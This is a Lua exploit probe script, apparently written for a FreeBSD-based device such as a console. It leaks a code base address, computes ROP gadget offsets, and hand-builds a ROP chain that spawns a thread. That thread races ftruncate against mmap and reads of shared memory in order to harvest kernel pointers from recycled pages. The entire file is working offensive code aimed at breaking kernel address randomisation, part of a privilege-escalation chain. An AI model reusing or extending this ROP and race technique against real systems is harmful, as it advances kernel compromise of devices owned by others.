-- CRASH_CLASS: MODERATE
-- PROBE 97a: SHM ftruncate vs mmap/read cross-thread race
--
-- Race: child thread loops ftruncate(shm, 0) / ftruncate(shm, big) while
-- main thread reads mapped pages. If the page is freed during read, we get
-- stale page content (potential kernel pointers from recycled page).
-- Also: child ftruncate while main thread mmaps the shm.

print("=== PROBE 97a: SHM FTRUNCATE MMAP RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)

local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_bare_ret = eb + 0x42

-- Ignore SIGSYS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
-- SIGALRM handler
wq(N(sa), g_bare_ret); wd(N(sa)+8, 0); wq(N(sa)+16, uint64(0))
pcall(function() mk(416)(uint64(14), sa, uint64(0)) end)

local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Child that loops: ftruncate(fd, 0) -> ftruncate(fd, size) N times then exits
local function spawn_truncator(shm_fd, size, loops)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local ss = 0x2000
    local rsp = sb + ss - ((sb + ss) % 16) - 8

    local tcb = memory.alloc(0x1000)
    wq(N(tcb), uint64(N(tcb)))
    local fsb = memory.alloc(8)
    wq(N(fsb), uint64(N(tcb)))

    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end

    -- sysarch(SET_FSBASE)
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(fsb)))
    emit(g_pop_rax); emit(uint64(165))
    emit(stub)

    -- Loop: ftruncate(fd, 0) then ftruncate(fd, size)
    for i = 1, loops do
        -- ftruncate(480, rdi=fd, rsi=0)
        emit(g_pop_rdi); emit(uint64(shm_fd))
        emit(g_pop_rsi); emit(uint64(0))
        emit(g_pop_rax); emit(uint64(480))
        emit(stub)
        -- ftruncate(480, rdi=fd, rsi=size)
        emit(g_pop_rdi); emit(uint64(shm_fd))
        emit(g_pop_rsi); emit(uint64(size))
        emit(g_pop_rax); emit(uint64(480))
        emit(stub)
    end

    -- thr_exit
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)

    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa+i, 0) end
    wq(pa, g_bare_ret)
    wq(pa+8, uint64(0))
    wq(pa+0x10, uint64(sb))
    wq(pa+0x18, uint64(ss))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(pa+0x30, tid)

    local ok_t, rv_t = pcall(function()
        return mk(455)(uint64(pa), uint64(0x38))
    end)
    return ok_t and N(rv_t) == 0
end

-- ====== TEST A: ftruncate race while reading mapped pages ======
print("--- A: ftruncate while reading mapped shm ---")
local total_kptrs = 0
local total_crashes = 0

for round = 1, 10 do
    local ok_s, rv_s = pcall(function()
        return mk(482)(uint64(1), uint64(2), uint64(0x1FF))
    end)
    local shm_fd = ok_s and N(rv_s) or -1
    if shm_fd >= 0x80000000 then shm_fd = shm_fd - 0x100000000 end
    if shm_fd < 0 then print("R" .. round .. ": shm_open failed"); break end

    local sz = 0x10000  -- 64KB = 4 pages
    pcall(function() mk(480)(uint64(shm_fd), uint64(sz)) end)

    -- mmap the shm
    local ok_m, rv_m = pcall(function()
        return mk(477)(uint64(0), uint64(sz), uint64(3), uint64(1), uint64(shm_fd), uint64(0))
    end)
    local ma = ok_m and rv_m or nil

    if ma then
        -- Write known pattern
        for p = 0, 3 do
            pcall(function()
                memory.write_dword(ma + p * 0x4000, 0xDEAD0000 + p)
            end)
        end

        -- Spawn truncator: 200 loops of ftruncate(0) / ftruncate(64K)
        spawn_truncator(shm_fd, sz, 200)

        -- Main thread: read mapped pages rapidly, look for stale content
        local kp = 0
        local crashes = 0
        for scan = 1, 500 do
            for p = 0, 3 do
                local ok_r, val = pcall(function()
                    return memory.read_dword(ma + p * 0x4000)
                end)
                if not ok_r then
                    crashes = crashes + 1
                    break
                end
                if ok_r then
                    local v = N(val)
                    if v < 0 then v = v + 0x100000000 end
                    -- Check for unexpected content (not our pattern, not zero)
                    if v ~= 0xDEAD0000 + p and v ~= 0 then
                        local hi4 = math.floor(v / 0x10000000)
                        if hi4 >= 0xF then
                            print(string.format("  R%d.%d KPTR page%d: 0x%08X", round, scan, p, v))
                            kp = kp + 1
                        end
                    end
                end
            end
            if crashes > 5 then break end
        end
        total_kptrs = total_kptrs + kp
        total_crashes = total_crashes + crashes

        -- Cleanup: unmap
        pcall(function() mk(73)(ma, uint64(sz)) end)
    end

    pcall(function() mk(6)(uint64(shm_fd)) end)

    if not alive() then print("DEAD at R" .. round); break end
end
print(string.format("A: kptrs=%d crashes=%d", total_kptrs, total_crashes))

if not alive() then print("DEAD"); return end

-- ====== TEST B: mmap during ftruncate ======
print("")
print("--- B: mmap during ftruncate ---")
local b_kptrs = 0

for round = 1, 10 do
    local ok_s, rv_s = pcall(function()
        return mk(482)(uint64(1), uint64(2), uint64(0x1FF))
    end)
    local shm_fd = ok_s and N(rv_s) or -1
    if shm_fd >= 0x80000000 then shm_fd = shm_fd - 0x100000000 end
    if shm_fd < 0 then break end

    local sz = 0x10000
    pcall(function() mk(480)(uint64(shm_fd), uint64(sz)) end)

    -- Spawn truncator
    spawn_truncator(shm_fd, sz, 300)

    -- Main thread: mmap/read/munmap loop
    for attempt = 1, 100 do
        local ok_m, rv_m = pcall(function()
            return mk(477)(uint64(0), uint64(sz), uint64(1), uint64(1), uint64(shm_fd), uint64(0))
        end)
        if ok_m and rv_m then
            -- Read first dword
            local ok_r, val = pcall(function()
                return memory.read_dword(rv_m)
            end)
            if ok_r then
                local v = N(val)
                if v < 0 then v = v + 0x100000000 end
                local hi4 = math.floor(v / 0x10000000)
                if hi4 >= 0xF and v ~= 0xFFFFFFFF then
                    print(string.format("  R%d.%d KPTR: 0x%08X", round, attempt, v))
                    b_kptrs = b_kptrs + 1
                end
            end
            pcall(function() mk(73)(rv_m, uint64(sz)) end)
        end
    end

    pcall(function() mk(6)(uint64(shm_fd)) end)
    if not alive() then print("DEAD at R" .. round); break end
end
print(string.format("B: kptrs=%d", b_kptrs))

print("")
print("alive=" .. tostring(alive()))
print("=== 97a COMPLETE ===")
